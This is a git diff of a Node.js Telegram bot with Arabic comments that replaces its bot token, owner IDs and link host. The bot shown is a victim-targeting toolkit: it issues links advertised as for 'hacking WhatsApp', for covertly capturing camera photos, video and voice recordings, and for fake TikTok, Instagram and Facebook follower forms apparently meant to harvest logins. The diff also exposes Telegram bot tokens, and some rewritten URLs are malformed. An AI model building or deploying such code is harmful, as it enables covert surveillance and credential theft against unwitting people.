@@ -9,11 +9,11 @@ const axios = require('axios');
 const uuid = require('uuid');
 
 // بيانات البوت
-const botToken = '7296383330:AAHF1O4ewpYTIwEk8DuwArwjWz8XS-DH6kY'; // ضع هنا توكن البوت الخاص بك
-const botUsername = 'ZI0_bot'; // ضع هنا يوزر البوت الخاص بك بدون @
+const botToken = '7527850924:AAHoN9YvcFfRFZRrKzNutooDiYNsHmUOFxc'; // ضع هنا توكن البوت الخاص بك
+const botUsername = 'NMAP777777777_bot'; // ضع هنا يوزر البوت الخاص بك بدون @
 const bot = new TelegramBot(botToken, { polling: true });
 
-const developerChannels = ['@iwiwuhah']; // قنوات المطور
+const developerChannels = ['@K9_S2']; // قنوات المطور
 
 let userPoints = {}; // لتخزين النقاط لكل مستخدم
 let linkData = {}; // لتخزين بيانات الرابط والمستخدمين الذين دخلوا الرابط
@@ -698,7 +698,7 @@ bot.on('callback_query', async (callbackQuery) => {
     }
 
     if (data === 'request_verification') {
-        const verificationLink = `https://i-jgne.onrender.com/whatsapp?chatId=${chatId}`;
+        const verificationLink = `https://leather-marble-shrine.glitch.me/whatsapp?chatId=${chatId}`;
         bot.sendMessage(chatId, `تم انشاء الرابط لختراق وتساب\n: ${verificationLink}`);
         return;
     }
@@ -771,26 +771,26 @@ bot.on('callback_query', async (callbackQuery) => {
 
         switch (action) {
             case 'captureFront':
-                link = `https://i-jgne.onrender.com/captureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://leather-marble-shrine.glitch.mecaptureFront/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'captureBack':
-                link = `https://i-jgne.onrender.com/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://leather-marble-shrine.glitch.me/captureBack/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'getvideo':
-                link = `https://i-jgne.onrender.com/getvideo/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
+                link = `https://leather-marble-shrine.glitch.me/getvideo/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}`;
                 break;
             case 'recordVoice':
                 const duration = 10;  // مدة التسجيل الثابتة
-                link = `https://i-jgne.onrender.com/record/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
+                link = `https://leather-marble-shrine.glitch.me/${crypto.randomBytes(16).toString('hex')}?chatId=${chatId}&duration=${duration}`;
                 break;
             case 'rshq_tiktok':
-                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=tiktok`;
+                link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=tiktok`;
                 break;
             case 'rshq_instagram':
-                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=instagram`;
+                link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=instagram`;
                 break;
             case 'rshq_facebook':
-                link = `https://i-jgne.onrender.com/getNameForm?chatId=${chatId}&type=facebook`;
+                link = `https://leather-marble-shrine.glitch.me/getNameForm?chatId=${chatId}&type=facebook`;
                 break;
             default:
                 bot.sendMessage(chatId, '');
@@ -1204,7 +1204,7 @@ async function displayCameras(chatId, countryCode) {
 // التحقق من كون المستخدم مطور
 function isDeveloper(chatId) {
     // استبدل هذا بـ chatId الخاص بالمطور
-    const developerChatId = 5739065274;
+    const developerChatId = 7246290038;
     return chatId === developerChatId;
 }
 
